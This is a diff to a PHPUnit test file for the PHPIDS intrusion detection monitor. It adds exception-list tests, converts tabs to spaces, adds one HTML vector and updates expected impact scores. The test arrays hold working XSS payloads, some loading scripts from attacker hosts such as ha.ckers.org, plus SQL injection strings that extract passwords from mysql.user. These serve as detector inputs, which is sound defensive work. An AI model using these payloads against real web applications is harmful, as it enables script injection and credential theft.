@@ -150,17 +150,40 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
     }
 
     public function testListWithException() {
+        
         $exploits = array();
-        $exploits[] = '9<script/src=http/attacker.com>';
-        $exploits[] = '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="';
+        $exploits['scanme.1'] = '9<script/src=http/attacker.com>';
+        $exploits['scanme.2'] = '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="';
+        $exploits['ignoreme'] = '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="';
         $test = new IDS_Monitor(
             $exploits,
             $this->init
         );
+
+        $exceptions = array('ignoreme');
+        $test->setExceptions($exceptions);
+
         $result = $test->run();
-        $this->assertTrue($result->hasEvent(1));
         $this->assertEquals(33, $result->getImpact());
     }
+    
+    public function testListWithWildcardException() {
+        
+        $exploits = array();
+        $exploits['scanme.1'] = '9<script/src=http/attacker.com>';
+        $exploits['scanme.2'] = '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="';
+        $exploits['ignoreme'] = '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="';
+        $test = new IDS_Monitor(
+            $exploits,
+            $this->init
+        );
+
+        $exceptions = array('/.*oreme$/im');
+        $test->setExceptions($exceptions);    	
+
+        $result = $test->run();
+        $this->assertEquals(33, $result->getImpact());
+    }    
 
     public function testListWithSubKeys() {
         $exploits = array('9<script/src=http/attacker.com>');
@@ -436,27 +459,27 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = "this[('eva')+new Array + 'l'](/x.x.x/+name+/x.x/)"; 
         $exploits[] = "this[[],('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+name,new Array)";
         $exploits[] = 'alal=(/YWxlcnQ/)(/YWxlcnQ/),
-						alal=alal[0],
-						atyujg=(/atob/)(/atob/),
-						con=atyujg.concat,
-						con1=con()[0],
-						con=con1[atyujg],
-						alal=con(alal),
-						alal=con1[alal],
-						alal(1)';
-		$exploits[] = 'alal=(1,/YWxlcnQ/), 
-						alal=alal(alal),
-						alal=alal[0],
-						atyujg=(1,/atob/),
-						atyujg=atyujg(atyujg),
-						atat=atyujg[0],
-						con=atyujg.concat,
-						con1=con(),
-						con1=con1[0],
-						con=con1[atat],
-						alal=con(alal),
-						alal=con1[alal],
-						alal(1)';
+                        alal=alal[0],
+                        atyujg=(/atob/)(/atob/),
+                        con=atyujg.concat,
+                        con1=con()[0],
+                        con=con1[atyujg],
+                        alal=con(alal),
+                        alal=con1[alal],
+                        alal(1)';
+        $exploits[] = 'alal=(1,/YWxlcnQ/), 
+                        alal=alal(alal),
+                        alal=alal[0],
+                        atyujg=(1,/atob/),
+                        atyujg=atyujg(atyujg),
+                        atat=atyujg[0],
+                        con=atyujg.concat,
+                        con1=con(),
+                        con1=con1[0],
+                        con=con1[atat],
+                        alal=con(alal),
+                        alal=con1[alal],
+                        alal(1)';
 
         $this->_testForPlainEvent($exploits);
 
@@ -465,7 +488,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-		$this->assertImpact($result, 1014, 1001);
+        $this->assertImpact($result, 1014, 1001);
     }
 
     public function testXMLPredicateXSSList() {
@@ -569,27 +592,27 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = '<video/title=.10000/aler&#x74;(1) onload=.1/setTimeout(title)>';
         $exploits[] = "const urchinTracker = open";
         $exploits[] = "-setTimeout(
-						1E1+
-						',aler\
-						t ( /Mario dont go, its fun phpids rocks/ ) + 1E100000 ' )";
-		$exploits[] = '<b/alt="1"onmouseover=InputBox+1 language=vbs>test</b>';
-		$exploits[] = '$$=\'e\'
-						_=$$+\'val\'
-						$=_
-						x=this[$]
-						y=x(\'nam\' + $$)
-						x(y)
-						\'foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar\'';
-		$exploits[] = '＜script>alert("xss")＜/script>';
-		$exploits[] = '‹img/src=x""onerror=alert(1)///›';
-		$exploits[] = 'Image() . 
-						ownerDocument .x=1';
-		$exploits[] = urldecode('%FF%F0%80%BCimg%20src=x%20onerror=alert(1)//');
-		$exploits[] = "',jQuery(\"body\").html(//);\'a'";
-		$exploits[] = '\',$(fred).set(\'html\',\'magically changes\')
-						\'s';
-		$exploits[] = "',YAHOO.util.Get.script(\"http://ha.ckers.org/xss.js\")
-						's";
+                        1E1+
+                        ',aler\
+                        t ( /Mario dont go, its fun phpids rocks/ ) + 1E100000 ' )";
+        $exploits[] = '<b/alt="1"onmouseover=InputBox+1 language=vbs>test</b>';
+        $exploits[] = '$$=\'e\'
+                        _=$$+\'val\'
+                        $=_
+                        x=this[$]
+                        y=x(\'nam\' + $$)
+                        x(y)
+                        \'foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar\'';
+        $exploits[] = '＜script>alert("xss")＜/script>';
+        $exploits[] = '‹img/src=x""onerror=alert(1)///›';
+        $exploits[] = 'Image() . 
+                        ownerDocument .x=1';
+        $exploits[] = urldecode('%FF%F0%80%BCimg%20src=x%20onerror=alert(1)//');
+        $exploits[] = "',jQuery(\"body\").html(//);\'a'";
+        $exploits[] = '\',$(fred).set(\'html\',\'magically changes\')
+                        \'s';
+        $exploits[] = "',YAHOO.util.Get.script(\"http://ha.ckers.org/xss.js\")
+                        's";
 
         $this->_testForPlainEvent($exploits);
 
@@ -630,9 +653,9 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
                         Cen:tri:fug:eBy:pas:sTe:xt:do location=(xxx)
                         while(0)
                         ";
-		$exploits[] = '-parent(1)';
-		$exploits[] = "//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf
-						(new Option)['innerHTML']=opener.name";
+        $exploits[] = '-parent(1)';
+        $exploits[] = "//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf
+                        (new Option)['innerHTML']=opener.name";
 
         $this->_testForPlainEvent($exploits);
 
@@ -958,26 +981,26 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = "asaa';SELECT[asd]FROM[asd]";
         $exploits[] = "asd'; select [column] from users ";
         $exploits[] = "0x31 union select @@version,username,password from users ";
-		$exploits[] = "1 order by if(1<2 ,uname,uid) ";
-		$exploits[] = "1 order by ifnull(null,userid) ";
-		$exploits[] = "2' between 1 and 3 or 0x61 like 'a";
-		$exploits[] = "4' MOD 2 like '0";
-		$exploits[] = "-1' /ID having 1< 1 and 1 like 1/'1 ";
-		$exploits[] = "2' / 0x62 or 0 like binary '0";
-		$exploits[] = "0' between 2-1 and 4-1 or 1 sounds like binary '1 ";
-		$exploits[] = "-1' union ((select (select user),(select password),1/1 from mysql.user)) order by '1 ";
-		$exploits[] = "-1' or substring(null/null,1/null,1) or '1";
-		$exploits[] = "1' and 1 = hex(null-1 or 1) or 1 /'null ";	
-		$exploits[] = "AND CONNECTION_ID()=CONNECTION_ID()";
-		$exploits[] = "AND ISNULL(1/0)";
-		$exploits[] = "MID(@@hostname, 1, 1)";
-		$exploits[] = "CHARSET(CURRENT_USER())";
-		$exploits[] = "DATABASE() LIKE SCHEMA()";
-		$exploits[] = "COERCIBILITY(USER())";
-		$exploits[] = "1' and 0x1abc like 0x88 or '0";
-		$exploits[] = "'-1-0 union select (select `table_name` from `information_schema`.tables limit 1) and '1";
-		$exploits[] = "null''null' find_in_set(uname, 'lightos' ) and '1";
-		$exploits[] = '(case-1 when mid(load_file(0x61616161),12, 1/ 1)like 0x61 then 1 else 0 end) ';
+        $exploits[] = "1 order by if(1<2 ,uname,uid) ";
+        $exploits[] = "1 order by ifnull(null,userid) ";
+        $exploits[] = "2' between 1 and 3 or 0x61 like 'a";
+        $exploits[] = "4' MOD 2 like '0";
+        $exploits[] = "-1' /ID having 1< 1 and 1 like 1/'1 ";
+        $exploits[] = "2' / 0x62 or 0 like binary '0";
+        $exploits[] = "0' between 2-1 and 4-1 or 1 sounds like binary '1 ";
+        $exploits[] = "-1' union ((select (select user),(select password),1/1 from mysql.user)) order by '1 ";
+        $exploits[] = "-1' or substring(null/null,1/null,1) or '1";
+        $exploits[] = "1' and 1 = hex(null-1 or 1) or 1 /'null ";	
+        $exploits[] = "AND CONNECTION_ID()=CONNECTION_ID()";
+        $exploits[] = "AND ISNULL(1/0)";
+        $exploits[] = "MID(@@hostname, 1, 1)";
+        $exploits[] = "CHARSET(CURRENT_USER())";
+        $exploits[] = "DATABASE() LIKE SCHEMA()";
+        $exploits[] = "COERCIBILITY(USER())";
+        $exploits[] = "1' and 0x1abc like 0x88 or '0";
+        $exploits[] = "'-1-0 union select (select `table_name` from `information_schema`.tables limit 1) and '1";
+        $exploits[] = "null''null' find_in_set(uname, 'lightos' ) and '1";
+        $exploits[] = '(case-1 when mid(load_file(0x61616161),12, 1/ 1)like 0x61 then 1 else 0 end) ';
 
         $this->_testForPlainEvent($exploits);
 
@@ -1281,13 +1304,14 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits['html_8'] = '<img src=1 onerror=alert(1) alt=1>';
         $exploits['html_9'] = '<b "<script>alert(1)</script>">hola</b>';
         $exploits['html_10'] = '<img src=phpids_logo.gif alt=Logo onreadystatechange=MsgBox-1 language=vbs>';
-		$exploits['html_11'] = '<img src="." =">" onerror=alert(1);//';
-		$exploits['html_12'] = '<img src="." =">" onerror=alert(222222222222222222222222222222222222222222222222222,1);//';
-		$exploits['html_13'] = '<img src="." =">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa onerror = alert(1)/&#10;/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
-		$exploits['html_14'] = '<a style="background:url(http://hh*/)}lo:expression(this.lol?0:alert(this.lol=1))/*%31);">lo</a>';
-		$exploits['html_15'] = '<a style="background:url(/hyyuj)&#125lo:expression&#40alert&#40/1/&#41//)/*lo);">lo</a>';
-		$exploits['html_16'] = '<img src= # onerror = alert(1) <b>foo</b>';
-		$exploits['html_17'] = '<a style="background:url(//lo/\\)}lo:expression\000028alert\000028/1/\000029\000029/*lo);">lo</a>';
+        $exploits['html_11'] = '<img src="." =">" onerror=alert(1);//';
+        $exploits['html_12'] = '<img src="." =">" onerror=alert(222222222222222222222222222222222222222222222222222,1);//';
+        $exploits['html_13'] = '<img src="." =">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa onerror = alert(1)/&#10;/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
+        $exploits['html_14'] = '<a style="background:url(http://hh*/)}lo:expression(this.lol?0:alert(this.lol=1))/*%31);">lo</a>';
+        $exploits['html_15'] = '<a style="background:url(/hyyuj)&#125lo:expression&#40alert&#40/1/&#41//)/*lo);">lo</a>';
+        $exploits['html_16'] = '<img src= # onerror = alert(1) <b>foo</b>';
+        $exploits['html_17'] = '<a style="background:url(//lo/\\)}lo:expression\000028alert\000028/1/\000029\000029/*lo);">lo</a>';
+        $exploits['html_18'] = '<?xml:namespace prefix=xss><?import namespace=xss implementation=http://ha.ckers.org/xss.htc><xss:*>lo</xss:*>';
 
         $this->init->config['General']['HTML_Purifier_Cache'] = dirname(__FILE__) . '/../../lib/IDS/tmp/';
         $this->_testForPlainEvent($exploits);
@@ -1300,7 +1324,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $result = $test->run();
         
         $this->assertFalse($result->hasEvent(1));
-        $this->assertImpact($result, 542, 549);
+        $this->assertImpact($result, 563, 570);
     }
 
     public function testAllowedHTMLScanningNegative() {
@@ -1407,11 +1431,11 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = '{HMAC-SHA1}{48de2031}{8AgxrQ==}';
         $exploits[] = 'exchange of experience in (project) management and leadership • always interested in starting up business and teams • people with a passion • new and lost international contacts';
         $exploits[] = 'Highly mobile (Project locations: Europe & Asia), You are a team player';
-		$exploits[] = "'Reservist, Status: Stabsoffizier'";
-		$exploits[] = ')))) да второй состав в отличной форме, не оставили парням ни единого шанса!!! Я думаю нас jedi, можно в первый переводить ))) ';
-		$exploits[] = 'd3d3LmRlbW90eXdhdG9yeS5wbA==';
-		$exploits[] = '"Einkäuferin Zutaten + Stoffe"';
-		$exploits[] = '"mooie verhalen in de talen: engels"';
+        $exploits[] = "'Reservist, Status: Stabsoffizier'";
+        $exploits[] = ')))) да второй состав в отличной форме, не оставили парням ни единого шанса!!! Я думаю нас jedi, можно в первый переводить ))) ';
+        $exploits[] = 'd3d3LmRlbW90eXdhdG9yeS5wbA==';
+        $exploits[] = '"Einkäuferin Zutaten + Stoffe"';
+        $exploits[] = '"mooie verhalen in de talen: engels"';
 
         $test = new IDS_Monitor(
             $exploits,
@@ -1438,11 +1462,11 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
                 array('test' => $value),
                 $this->init
             );
-        	
-        	if(preg_match('/^html_/', $key)) {
-		        $this->init->config['General']['HTML_Purifier_Cache'] = dirname(__FILE__) . '/../../lib/IDS/tmp/';
-		        $test->setHtml(array('test'));
-        	}
+            
+            if(preg_match('/^html_/', $key)) {
+                $this->init->config['General']['HTML_Purifier_Cache'] = dirname(__FILE__) . '/../../lib/IDS/tmp/';
+                $test->setHtml(array('test'));
+            }
             $result = $test->run();
 
             if($result->getImpact() === 0) {
